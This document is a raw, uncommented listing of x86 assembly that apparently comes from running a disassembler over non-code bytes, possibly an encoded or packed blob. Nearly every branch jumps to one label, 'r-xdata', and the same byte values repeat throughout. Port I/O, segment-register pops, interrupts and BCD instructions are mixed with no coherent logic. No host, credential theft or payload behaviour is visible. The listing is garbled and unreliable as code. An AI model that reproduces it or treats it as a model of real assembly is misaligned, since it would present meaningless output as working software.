sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x97
jecxz r-xdata
daa
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
push ds
sbb al 0x1c
or dl bl
hlt
retn
jae r-xdata
jae r-xdata
or cl [ ecx ]
sbb [ esp + ebx ] bl
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6f656ab4
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
dec edx
adc [ esp + ebx ] bl
jae r-xdata
push 0xffffffa5
mov ebx 0xe3ec100b
jecxz r-xdata
jae r-xdata
mov ch 0xae
scasb [ edi ]
or dl [ ecx + 0x73e3e3c8 ]
bound ecx [ edi ]
shl ecx cl
jae r-xdata
pop ss
push 0x961ceba6
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
test [ edx - 0x4a ] ebp
iretd
and al 0xa
aas
leave
jecxz r-xdata
sar [ eax ] 0x1
fcom [ eax ]
or ch [ edx + 0x731c1c0a ]
outsb
cmpsd [ esi ] [ edi ]
sbb al 0x97
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
jecxz r-xdata
adc ah ch
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
and eax [ ebp + 0xa1da66a ]
movsd [ edi ] [ esi ]
shl ebx cl
fisttp [ 0xffffffffbfa56ab4 ]
sub al 0x8
sbb al 0x1c
push 0xe3e35f65
or dh [ ecx + 0x73e3e3e7 ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
or cl bl
outsb
sub ebx [ esi ]
sbb al 0x1c
or ebx [ edx ]
mov esp 0x85b98f89
push 0xffffffb6
int 0x85
push 0xffffffb6
ror [ edx ] cl
mov bh 0x8
sbb al 0x1c
jae r-xdata
or bh [ ebx ]
out 0xe3 eax
jecxz r-xdata
pushad
daa
aaa
or edi edi
sbb [ esp + ebx ] bl
mov edx 0x1c13f40a
pushad
xchg edi eax
sbb al 0x1c
or al [ ebp + 0x1e ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
mov bl 0xa
or [ eax ] ebx
sbb al 0x1c
pxor mm5 [ esi - 0x5a ]
jae r-xdata
lea esi [ ebp - 0x6ef55152 ]
jae r-xdata
enter 0xe3e3 0x73
jae r-xdata
jecxz r-xdata
pushad
jae r-xdata
jae r-xdata
jae r-xdata
push ds
jecxz r-xdata
int1
jae r-xdata
jae r-xdata
les cx [ eax ]
sbb al 0x1c
or esi [ edx - 0xb ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
mov ecx [ esp + ebx ]
pop ebx
mov ebx 0x24b58d86
jecxz r-xdata
psrlq mm4 mmx1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0x85
push 0xe085e1a4
cmpsd [ esi ] [ edi ]
imul esp ebx 0xffffffe2
jecxz r-xdata
out dx eax
or bl [ edi ]
hlt
sbb al 0x75
dec edi
aas
mov ebx 0x1c14a00a
mov al 0x1c
jne r-xdata
in al 0xe3
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
or al cl
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
xchg [ esp + ebx ] bx
jae r-xdata
push esp
jae r-xdata
jae r-xdata
jae r-xdata
mul bl
shl [ ebx ] 0x1
mov edx 0x1bbe6aba
sbb al 0x1c
jae r-xdata
push 0x14750a0f
clc
jecxz r-xdata
jae r-xdata
or bl [ esi ]
cld
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
outsb
jae r-xdata
pushad
cmpsb [ esi ] [ edi ]
sbb ecx ebx
fisub [ esi - 0x549e13e9 ]
int 0xe3
jecxz r-xdata
jecxz r-xdata
and bp sp
jae r-xdata
adc al 0x1c
or esi ecx
jae r-xdata
lfs ecx [ ecx - 0x2c1c7419 ]
mov esp ebx
shl ebx cl
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
scasb [ edi ]
mov ebx 0x23a62486
mov ch 0x24
xchg esi eax
or cl [ ecx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and cx [ edx ]
sbb al 0x1c
pushad
jae r-xdata
or ah [ edx + 0x1a ]
sbb al 0x1c
mov [ 0x1fa6e01b ] eax
test [ edx - 0x5a ] ebp
xor eax 0x859089bb
push 0xffffffa6
cmp edi [ ebx + 0x6a858089 ]
cmpsb [ esi ] [ edi ]
cmp [ eax + 0x22 ] ebp
test [ edx - 0x5a ] ebp
jecxz r-xdata
jae r-xdata
pushfd
out 0xe3 eax
in al dx
int1
xlat
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
sbb al 0x60
xchg edi eax
mul ebx
outsb
fnstsw ax
pushad
mov edi 0xdc0af7c7
add ecx [ edx ]
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
sbb al 0x96
out dx eax
mov ebx esp
push 0xffffffa6
jae r-xdata
pop ds
jae r-xdata
mov ebx 0xb32354ec
jae r-xdata
pushad
cwde
mov esi 0xa9189b3
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb bl [ esp + ebx ]
jae r-xdata
inc ebp

push 0xffffffa6
out dx eax
or dh [ eax ]
pop es
sbb al 0x66
jae r-xdata
sbb al 0x60
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
jae r-xdata
pop es
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
pushad
in al dx
jae r-xdata
sbb al 0x1c
call 0x612a10dd
jecxz r-xdata
mov [ ecx - 0x1c0934f6 ] edx
jae r-xdata
std
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
cmpsb [ esi ] [ edi ]
aaa
mov bl 0x1c
xchg ebp eax
mov bl 0xa
cmp edi eax
jecxz r-xdata
in al dx
inc ecx
push 0xffffffbe
pop ds
push 0xffffffae
pop ss
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
pop ds
pop ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xa66a1ba6
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
test [ eax - 0x23 ] esp
jecxz r-xdata
and esi [ ebx - 0x6ff4da98 ]
jae r-xdata
jae r-xdata
daa
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
pop es
mov al 0xb3
or ecx [ ebx + 0x17 ]
sbb al 0x1c
or bl [ edi + 0x731c1c19 ]
jae r-xdata
or edx [ edi + edx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
imul esi [ eax + 0x17540bb3 ] 0x1c
lahf
mov edx 0xcf0a2366
adc [ esp + ebx ] bl
or ebp ebx
sahf
loope r-xdata
mov dh 0xa
xor [ edi ] al
jae r-xdata
push 0xffffffa6
pop ss
mov al 0xb3
or esi [ eax + edx ]
sbb al 0x1c
pushad
mov bl 0x25
cmpsb [ esi ] [ edi ]
sbb al 0xe3
or edi [ 0xffffffffb31c1c0e ]
cmpsb [ esi ] [ edi ]
sbb al 0xb5
mov bl 0xa
mov ch cl
jecxz r-xdata
rcl [ edi ] cl
sbb al 0x1c
mov [ edi + 0x1c87666e ] esp
sbb al 0x1c
mov ch 0xb3
or cl [ edx + 0x73e3e3e9 ]
jae r-xdata
adc bx si
jecxz r-xdata
push 0x17900b25
jae r-xdata
jae r-xdata
pop ss
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
or cl [ ebx + 0xa ]
sbb al 0x1c
jae r-xdata
sbb al 0x1c
in al 0xfb
sub dh [ ebp - 0x49957a4d ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
sbb al 0xb3
outsb
aaa
push ds
sbb al 0x1c
mov bl 0xb
mov [ 0x60e3e3eb ] al
sbb al 0xb3
or dl [ eax ]
add eax 0xec731c1c
push 0xffffffa6
jae r-xdata
outsb
or ah [ esi + 0x1 ]
daa
out dx eax
push 0xffffffa7
or edx [ eax + 0x601c1c17 ]
jae r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
test [ eax - 0x68 ] esp
mov dl 0xb3
sbb al 0x96
pop es
sbb al 0xb4
push 0xa6e01ba3
pop ds
jae r-xdata
sbb al 0x1c
jae r-xdata
iretd
add eax 0xf9920abb
jecxz r-xdata
test [ edx - 0x5a ] ebp
jecxz r-xdata
mov [ ebx + edi * 4 + 0x6a859389 ] ecx
or dl [ ebx + 0x73e3e3fc ]
jae r-xdata
add eax 0x13ae6a85
or dl [ edi + 0x1d ]
mov bl 0x85
jae r-xdata
mov ch 0xe2
jecxz r-xdata
sahf
out 0xe3 eax
jecxz r-xdata
jae r-xdata
rcr [ eax + ebp * 2 ] 0x1
xchg edi eax
jae r-xdata
pop ss
push 0x9e6a851d
pop ebp
xchg [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
mov ebx 0xe3f9920a
jecxz r-xdata
jae r-xdata
or [ esp + ebx ] ebx
cmpsd [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
cld
jae r-xdata
push 0xffffffb6
jae r-xdata
jecxz r-xdata
or edx [ esi ]
sbb al 0x1c
mov [ 0xb666eb3 ] eax
pop ds
movsb [ edi ] [ esi ]
ficomp [ eax - 0x4a991335 ]
loop r-xdata
sbb bl [ esp + ebx ]
rcl [ 0x67ec2366 ] 0x1
bswap ebx
pushad
fucom st3
in al dx
and ecx [ ecx - 0x59957a09 ]
jae r-xdata
pop ss
pushad
and ch bl
or ah ah
sbb ebx [ esp + ebx ]
jae r-xdata
push 0xd0075e97
sub ch [ eax - 0x42 ]
pop ss
push 0x1c193035
jae r-xdata
cmpsb [ esi ] [ edi ]
xor edi [ ebx + 0x6a858689 ]
cmpsb [ esi ] [ edi ]
cmp [ esi - 0x5a ] ch
jae r-xdata
jecxz r-xdata
and bp sp
bswap ebx
jecxz r-xdata
arpl [ esi + 0x66ece1f3 ] bx
in al 0xfb
retn
jae r-xdata
jae r-xdata
outsb
jae r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xa66a1fa6
sub ah [ eax ]
jae r-xdata
jecxz r-xdata
out 0xe3 ax
adc [ 0xffffffffec731c1c ] al
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0xb3
or ebx eax
push cs
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
and edx eax
test [ ebp - 0x7ae45996 ] 0x6e0dae6a
test [ edx - 0x5a ] ebp
or eax 0x1c1fe50a
sbb al 0x73
jae r-xdata
pop esi
pop es
jae r-xdata
mov bl 0xec
push esp
in al 0xb3
test [ eax - 0x5c ] ebp
loope r-xdata
push esp
jae r-xdata
sar [ ebx + 0x6a85c689 ] 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
imul esi [ ebx + ecx - 0x1c1c17dd ] 0xbaba3b68
push 0xffffffbe
pop ds
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
adc ecx [ edx ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
nop [ esp + ebx ] bx
mov bl 0x68
adc al 0xb
jpo r-xdata
mov bl 0x6e
or bx [ edi ]
and ecx [ edx ]
test [ esi ] dl
sbb al 0x1c
mov bl 0xb
fmul [ esi ]
pushad
daa
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
loopne r-xdata
push ss
shr [ edx ] 0x1
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
xor [ edx ] ecx
push edx
out 0xe3 eax
jecxz r-xdata
push 0xffffffa6
loopne r-xdata
mov bl 0x68
jae r-xdata
mov ch 0x1c
mov ah 0xaf
push 0x65
dec ebx
jecxz r-xdata
xchg esi eax
test [ edx - 0x4a ] ebp
and bp sp
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
jecxz r-xdata
push 0xc30f600f
mov al 0xa
int 0x12
sbb al 0x1c
jae r-xdata
in al dx
mov bx 0xe3c9
jecxz r-xdata
outsb
push di
sbb ebx [ esp + ebx ]
mov bl 0xd0
cmp [ eax - 0x1c3dc5f6 ] dh
jecxz r-xdata
jae r-xdata
jae r-xdata
imul ebx [ bx + di ] 0xc18b1c1c
loope r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
push edi
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
daa
sub ah [ eax ]
in al dx
xchg ebp ebp
pushad
cmpsb [ esi ] [ edi ]
sbb eax [ ebp + 0x6e0dae6a ]
push 0xffffffa6
adc eax 0xf78923d0
test [ edx - 0x5a ] ebp
enter 0xe3e3 0x73
jae r-xdata
mov ch 0xb3
jae r-xdata
push 0x356817be
xor [ ecx ] bl
sbb al 0xa6
or ch [ eax ]
jmp r-xdata
int 0xe3
jecxz r-xdata
and eax 0x1c17900b
sbb al 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx eax
and ebp esp
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp ah ch
or esp [ ebx ]
call 0x3baf13a6
mov edx 0x1fbe6aba
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov esi 0xc9a00a1f
jae r-xdata
jae r-xdata
add edi [ ebx - 0x4ff56f77 ]
mov ecx eax
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
test [ edx - 0x4a ] ebp
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
jae r-xdata
loop r-xdata
jae r-xdata
mov ch 0xb4
or dh ah
or [ esp + ebx ] ebx
jae r-xdata
mov edi 0x60e3e3e9
loope r-xdata
out dx eax
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx esp
jae r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x7373202a ] eax
xchg esi eax
mov ebx 0x6a85c689
cmpsb [ esi ] [ edi ]
mov [ esi + 0xfb66a85 ] edx
mov ecx 0xdb66a85
mov [ esi - 0x1c1f5af6 ] ecx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x5
test [ edx - 0x52 ] ebp
mov eax 0x7373202a
sar [ eax ] 0x1
outsb
cmpsb [ esi ] [ edi ]
xchg ebp eax
or ch dh

push 0x9e6a8518
and ebp [ eax + 0x1a ]
or dl [ edx + 0x73e3e3cd ]
sbb eax 0x5d9e6a85
mov ebp ecx
jecxz r-xdata
sbb al 0x96
jae r-xdata
and al dl
jae r-xdata
jecxz r-xdata
jmp r-xdata
xchg ebx eax
sbb [ esp + ebx ] ebx
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
push 0x6ababa3b
mov esi 0xec38661f
jecxz r-xdata
stosd [ edi ]
retn
mov dl 0xb4
push 0x4b741c1b
in al dx
adc ax 0xe3fb
jecxz r-xdata
and esp [ ebx + 0x7373202a ]
mov al 0xa
dec ecx
int1
jecxz r-xdata
in al dx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
aas
fsub [ ebp - 0x44991329 ]
leave
jecxz r-xdata
dec ebx
and ebp esp
fld st5
jecxz r-xdata
jae r-xdata
lahf
push ds
sbb al 0x1c
mov bl 0xd0
adc eax 0xafb41cb5
cmp dh ah
and eax 0x688bd0e7
mov esi 0xe0f8681f
xor ch [ edx - 0x41 ]
shr eax cl
test eax ebx
xor ch ah
or ecx [ edx ]
jae r-xdata
sub ah dh
pop ecx
jae r-xdata
and esi [ ebx - 0x200f54d ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jge r-xdata
jae r-xdata
sub ebx edi
sbb al 0xb4
iretd
daa
mov [ 0x25d2308b ] eax
or edi [ edi + 0x60e3e3e9 ]
jae r-xdata
jecxz r-xdata
fidivr [ esi - 0x365ff5e1 ]
jae r-xdata
jae r-xdata
pushad
xchg [ edi ] bl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0xf6
jecxz r-xdata
and esp esi
mov [ edx ] ch
out 0x59 al
and eax 0x73e3e3ea
jae r-xdata
enter 0xe3f1 0xe3
push 0x54ec1bbe
fdiv [ edx ]
in al dx
jecxz r-xdata
test [ edx - 0x9 ] ebp
push 0x9e6a851d
sbb eax edx
sbb al 0xa
or ebp [ ebx + 0x1ce3e3fc ]
pop edi
mov bl 0xa
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa6
pop ss
push 0xffffffa6
sbb ecx [ edx ]
lar ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
or ch [ ebx + 0x73e3e3c3 ]
jae r-xdata
jae r-xdata
ud1 eax [ ebp - 0x76f24996 ]
push 0xffffffb6
lahf
adc [ esp + ebx ] bl
or bh ch
rcl [ 0x65ec20d8 ] 0x1
mov bl 0x24
jecxz r-xdata
std
jecxz r-xdata
mov ebx 0xb00a9089
and [ ebx + 0x73 ] dh
or dl dh
scasb [ edi ]
sub eax 0x731c1c07
jae r-xdata
xchg esi eax
jae r-xdata
push cs
sbb al 0x1c
or bl [ eax - 0x761c1c10 ]
jecxz r-xdata
shr edi cl
and eax 0x20f3d3a7
xchg edi eax
jae r-xdata
jae r-xdata
jae r-xdata
retn 0xe3e3
sbb al 0xa
std
daa
out dx eax
ficomp [ eax + 0x1566ecdf ]
sti
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xa4ba66e ]
jae r-xdata
mov ch 0xb4
push 0xffffffa6
pop ds
or ch [ ecx ]
sti
sbb al 0x30
push 0xec156613
mov ch 0x19
sbb al 0x1c
mov ebx [ edi + 0x38 ]
dec eax
pop esi
mov ah 0x6a
pop ebp
daa
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x68
sbb ebx [ esp + esi * 2 ]
dec ebx
push 0xa1c661b
jecxz r-xdata
sbb eax 0x119e6a85
or al [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffff97
jecxz r-xdata
jae r-xdata
or ah [ 0x73e3e3ea ]
jae r-xdata
mov bl 0x6e
jae r-xdata
movnti [ eax + 0x1c12cd0a ] esi
sbb al 0x73
jae r-xdata
push es
sbb al 0xa
jecxz r-xdata
jae r-xdata
stosd [ edi ]
shl bl 0xe3
scasb [ di ]
pop ss
sbb al 0x1c
jae r-xdata
push 0x9e6a851d
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop edi
adc [ edx ] ecx
pop es
push 0xffffff9e
adc ebp [ eax + 0x1d ]
jecxz r-xdata
jmp 0x27a7150a
jecxz r-xdata
0x7373e3e3 0x3888
outsb
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
call [ ecx ]
sbb al 0x1c
outsd
pop ds
adc al 0x1c
sbb al 0x89
jecxz r-xdata
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xa
sbb eax [ ebx ]
sbb al 0x1c
jae r-xdata
sbb al 0x65
test [ edx - 0x62 ] ebp
in al dx
jae r-xdata
or ah [ ebx - 0x3f ]
jae r-xdata
pushfd
shl ebx cl
jecxz r-xdata
push ebx
mov ch 0x68
sbb eax 0x199e6a85
rcr [ edx + ecx ] 0x1
jae r-xdata
shl [ ebx ] 0x1
mov bl 0xb3
or bh bh
std
sbb esp [ esi + 0x1c ]
or cl [ ebx + 0x73e3e3e9 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or al 0x14
sbb al 0x1c
mov ah 0x12
sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]

stosd [ edi ]
loope r-xdata
sbb ebp esp
push esp
xlat
jecxz r-xdata
pop ds
loopne r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ 0x731c1c07 ]
jae r-xdata
mov [ edi - 0x1c1fe6f6 ] eax
jecxz r-xdata
and edi [ edx + ebp + 0x73737320 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
and [ ebx ] esi
or cl bh
out dx al
jecxz r-xdata
add [ ebx + 0x6a85aa89 ] edi
cmpsb [ esi ] [ edi ]
pop es
mov ebx 0x6a858789
cmpsb [ esi ] [ edi ]
add eax 0x858689bb
push 0xffffffa6
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cld
jecxz r-xdata
push 0xffffffa6
sbb ecx [ edx ]
mov [ 0x73e3e3ee ] eax
in al dx
pop es
jae r-xdata
bound ebx [ ebp + 0x5f ]
push 0xdf0f600f
mov al 0xd0
and esi [ ebp - 0x1c0431f6 ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
jecxz r-xdata
pop ebp
pop edi
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jecxz r-xdata
jae r-xdata
jae r-xdata
hlt
push 0xffffffa6
jae r-xdata
mov al 0x3e
jae r-xdata
pop edi
mov bl 0x68
and eax 0x1c0b3d0a
sbb al 0x73
test [ eax - 0x26 ] esp
jecxz r-xdata
and ecx [ edx ]
imul eax [ edi ] 0x1c
sbb al 0x73
jae r-xdata
mov dh 0xa
shl bh 0xe3
aas
jae r-xdata
mov ebx 0x6a858d89
cmpsb [ esi ] [ edi ]
aaa
mov ebx 0xe20a9789
add ebx [ esp + ebx ]
jae r-xdata
mov ebp 0x73e3e3ce
in al dx
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
mov al [ 0xffffffffbc1c1c16 ]
push 0x3fe50a25
aad 0x1
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
xor al [ ebp - 0x2fec4996 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
sub [ ecx + 0x6a859489 ] edi
sbb al 0x97
sbb al 0x1c
jae r-xdata
pop edi
lea esi [ ebp - 0x1af55152 ]
cmp eax 0x73731c1c
mov ebx eax
test [ edx - 0x5a ] ebp
or [ ebx - 0x1c3887f6 ] edi
jecxz r-xdata
daa
stosd [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
mov [ esi + 0xba66a85 ] eax
jae r-xdata
or dh dh
add [ esp + ebx ] ebx
jae r-xdata
sbb al 0xc8
adc ah [ edi + 0x31 ]
jecxz r-xdata
sbb al 0x1c
mov esp 0xe50a2568
xchg esi eax
sbb al 0x1c
aad 0x1
jae r-xdata
or edi [ ebx - 0x1c3e9cf6 ]
mov ebx 0x6a858689
push esp
test [ edx - 0x9 ] ebp
in eax dx
test [ esi + 0x31 ] esp
in al dx
enter 0x6712 0x31
add [ esp + ebx ] ebx
jae r-xdata
jo r-xdata
xor esp ebp
jecxz r-xdata
jae r-xdata
jmp 0xffffffffb5f7176c
jae r-xdata
or ch [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x2b66ecf3
aas
jae r-xdata
xor [ ebp - 0x46ee4996 ] eax
mov [ edi + 0x2bb66a85 ] ecx
push 0xffffffb6
jae r-xdata
jae r-xdata
mov dh 0x2f
and bp sp
or bh dh
mul ebx
cmpsb [ esi ] [ edi ]
nop
and ebp esp
jae r-xdata
mov ecx 0xe3f4f20a
jecxz r-xdata
xchg esp eax
test [ edx - 0x4a ] ebp
das
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebp + 0x73e3e3ce ]
retn
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] ecx
sbb eax esp
jecxz r-xdata
jae r-xdata
mov ebp 0xeba66820
push 0xffffffa6
pop ds
or dl [ ecx + 0x731c1c1c ]
jae r-xdata
jae r-xdata
jae r-xdata
or bh bh
adc [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
stc
jecxz r-xdata
jae r-xdata
sbb al 0x1c
in al dx
sub di [ edi ]
jae r-xdata
sbb al 0xa
mov esp 0x731c1c3e
jae r-xdata
ja 0xffffffffb12a1771
mov bl 0xb0
mov al 0x89
in al 0xb0
or dl [ edx + ecx ]
adc al 0xb
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
and ebp esp
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
jae r-xdata
cmp bx [ esi ]
sbb al 0x1c
or al dh
in eax dx
jecxz r-xdata
jae r-xdata
push 0x1c1e3b66
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
inc bx
push ss
sbb al 0x1c
or bh [ esi + edi + 0x73731c1c ]
jae r-xdata
cmp eax 0x42871c1c
adc edx eax
push 0xb66a8532
jae r-xdata
adc eax 0x120a9189
loop r-xdata
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
fbstp [ eax + 0xab523d0 ]
jae r-xdata
or dh [ eax + 0x731c1c3e ]
jae r-xdata
into
sti
jecxz r-xdata
pandn mm6 [ eax + 0xab523d0 ]
jecxz r-xdata
or al al
mul ebx
pop ss
mov [ esi - 0x59957a45 ] eax
push 0xffffffa6
and bl [ edx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
xchg [ ebp - 0x46a04996 ] eax
mov [ ecx + 0x5db66a85 ] eax
or dl [ edx - 0xf ]
jecxz r-xdata
sub edi [ edi ]
jae r-xdata
and ecx [ edx ]
jae r-xdata
mov ch 0xb4
push 0xa38d01b
sbb al 0x1c
jae r-xdata
jae r-xdata
mov esi 0x9e6a8505
jae r-xdata
add eax 0x159e6a85
mov esi 0xb66a8507
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffbe
jae r-xdata
sbb al 0x1c
jae r-xdata
and esp ebx
mov ebx 0xe3c1630a
jae r-xdata
and esp ebx
jecxz r-xdata
or ah [ esi - 0x78e3e3c3 ]
inc edx
jae r-xdata
or ah ah
hlt
test [ edx - 0x4a ] ebp
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in eax 0xe3
mov edi 0x1c1bcf0a
xchg edi eax
sbb al 0x1c
jae r-xdata
aad 0xb4
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp esp
mov al 0xa
adc al 0xa
and al 0xa6
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0xb3
jae r-xdata
jecxz r-xdata
sub ch ah
jae r-xdata
adc eax 0xbfb66a85
test [ edx - 0x62 ] ebp
jae r-xdata
mov eax [ 0xffffffff85b93a68 ]
test [ edx - 0x4a ] ebp
jae r-xdata
test [ edx - 0x5a ] ebp
sbb edx eax
and eax [ ebp + 0x6e19a66a ]
aaa
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x731c1c0b
fsub [ eax ]
arpl cx ax
mov eax 0xebbe6a85
or bl [ ebx + edx * 8 - 0x59971c1d ]
mov edi edx
jecxz r-xdata
push 0x65
and esp ebx
push 0xb66a8533
mov dh 0x13
shl [ ecx ] 0x1
test [ edx - 0x4a ] ebp
adc [ ecx + 0x6a858f89 ] edi
mov dh 0x2b
bound ecx [ edi ]
jae r-xdata
shr [ edx - 0x69 ] cl
test eax 0xece3e3ee
push esp
not [ edx + 0xa332160 ]
iretd
adc eax 0x65ec20d8
push 0xffffffa6
and al 0xe3
loope r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
shl ebp 0xe3
jecxz r-xdata
push 0x65
mov [ ebx - 0x1c2c1c75 ] esp
pop ebx
jae r-xdata
outsb
mov ch 0xb3
or edx [ eax ]
push cs
sbb al 0x1c
in al dx
cli
or bl [ esp + ebx ]
shl [ ebx ] 0x1
mov ah 0x1c
mov ch 0x83
or cl [ edi + 0x73e3e3e5 ]
jae r-xdata
shr [ edx ] 0x1
test [ edx - 0x15 ] ebp
and [ ebx + 0x73 ] dh
jae r-xdata
bound esp [ edi ]
jecxz r-xdata
mov [ edx - 0x7a727647 ] ecx
push 0xffffffb6
mov dh 0xbf
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sahf
jae r-xdata
mov dh 0xa1
jae r-xdata
mov ecx 0x6a858d89
jae r-xdata
jae r-xdata
push 0xffffff9e
jae r-xdata
cmp bh [ ecx + 0x5be6a85 ]
xor [ edx ] ecx
test [ ecx ] 0x1c
sbb al 0x73
loopne r-xdata
mov al 0xb5
mov ah 0x68
sbb edx eax
cmp [ edx ] cl
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x7373202a
jae r-xdata
jecxz r-xdata
lodsb [ esi ]
dec ecx
or ebx [ esp + ebx ]
